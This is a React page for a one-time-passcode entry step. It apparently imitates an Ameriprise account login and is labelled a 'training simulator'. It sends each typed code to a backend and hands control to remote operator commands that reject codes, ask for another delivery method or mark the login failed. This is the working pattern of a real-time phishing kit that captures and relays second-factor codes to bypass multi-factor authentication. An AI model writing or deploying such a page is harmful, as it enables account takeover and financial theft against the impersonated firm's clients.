"use client";

import type { FormEvent } from "react";
import { useState, useEffect } from "react";
import { authFlowKeys } from "@/lib/auth-flow";
import { useAuthTraining } from "@/hooks/use-auth-training";
import { OtpMethod } from "@training-simulator/bus/types";
import { ClientAccessShell } from "../AccountShell";
import styles from "../page.module.css";

export default function InputOtpPage() {
  const [status, setStatus] = useState("");
  const [pending, setPending] = useState(false);
  const [complete, setComplete] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [method, setMethod] = useState<OtpMethod>("sms");
  const [otp, setOtp] = useState("");
  const [isComplete, setIsComplete] = useState(false);
  const [error, setError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [isRetryRequired, setIsRetryRequired] = useState(false);

  useAuthTraining(command => {
    if(command.type === "force_otp_retry" || command.type === "reject_otp") {
      setOtp(""); setIsWaiting(false); setIsRetryRequired(true);
      setError("Incorrect OTP. Choose another method to issue a new code.");
    }
    if(command.type === "mark_login_failed" || command.type === "reject_login") { setOtp(""); setError("Incorrect Credentials"); }
    if(command.type === "mark_session_failed") { setOtp(""); setIsComplete(true); setError(""); }
  }, snapshot => {
    if(snapshot.stage !== "ended") setIsComplete(false);
    if(snapshot.method) setMethod(snapshot.method);
    setIsWaiting(
      snapshot.stage === "otp_pending" || Boolean(snapshot.redirectPath),
    );
    setIsRetryRequired(snapshot.stage === "otp_rejected");
    if(snapshot.stage === "otp_pending") { setOtp(""); setError(""); }
    if(snapshot.stage === "otp_rejected") { setOtp(""); setError("Incorrect OTP. Choose another method to issue a new code."); }
    // if(snapshot.stage === "otp_entry" && snapshot.trainingCode) setError(`Training-only code: ${snapshot.trainingCode}`);
    if(snapshot.stage === "ended") { setOtp(""); setIsComplete(true); setError(""); }
  });

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    setMethod(params.get("method") === "email" ? "email" : "sms");
  }, []);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if( isSubmitting || isComplete || isWaiting || isRetryRequired) return;
    setError("");
    setIsSubmitting(true);
    setPending(true);
    setStatus("");

    const username = sessionStorage.getItem(authFlowKeys.ampUsername) || "";

    try {
      const response = await fetch("/api/auth/otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "otp_entered",
          username,
          otp,
          time: new Date().toISOString(),
        }),
      });

      const data = await response.json();

      if(!response.ok) { 
        setError(data.error); 
        setStatus(data.message ?? "Your request could not be processed. Please try again.");
        return; 
      }

      // setStatus(data.message ?? "Request received.");
      setIsWaiting(true);
      setOtp("");
      setError("");
      // setIsComplete(true);

      // window.location.replace("https://www.ameriprise.com/client-login");
    } catch {
      setError("Unable to submit the code. Please try again.");
      setStatus("Unable to connect. Please try again.");

    } finally {
      setPending(false);
      setIsSubmitting(false)
    }
  }

  return (
    <ClientAccessShell>
      <section className={`${styles.recoveryCard} ${styles.verificationCard}`} aria-labelledby="verification-code">
        <form onSubmit={handleSubmit}>
          <fieldset className={styles.formFields} disabled={pending || complete}>
            <ol className={styles.authSteps} >
              <li>1 · Sign in</li>
              <li aria-current={undefined}>2 · Delivery</li>
              <li aria-current={"step"}>3 · Verify</li>
            </ol>
            <h1 id="verification-code">Enter Verification Code</h1>
            <h2>ONE-TIME PASSCODE</h2>
            <label className={styles.recoveryField}>
              <span>Verification Code</span>
              <input
                aria-label="Six-digit verification code"
                autoComplete="one-time-code"
                inputMode="numeric"
                maxLength={6}
                name="otp"
                disabled={isComplete || isWaiting || isRetryRequired}
                onChange={(event) => setOtp(event.target.value.replace(/\D/g, ""))}
                pattern="[0-9]*"
                placeholder="000000"
                required
                type="text"
                value={otp}
              />
            </label>
            <div className={styles.recoveryActions}>
              <a href="/account-access/otp-method">Choose another method</a>
              <button type="submit">Submit</button>
            </div>
          </fieldset>
          <p className={styles.formStatus} role="status" aria-live="polite">
            {pending ? "Processing…" : status}
          </p>
          {/* {complete ? <a href="/account-access">Restart demo</a> : null} */}
        </form>
      </section>
    </ClientAccessShell>
  );
}
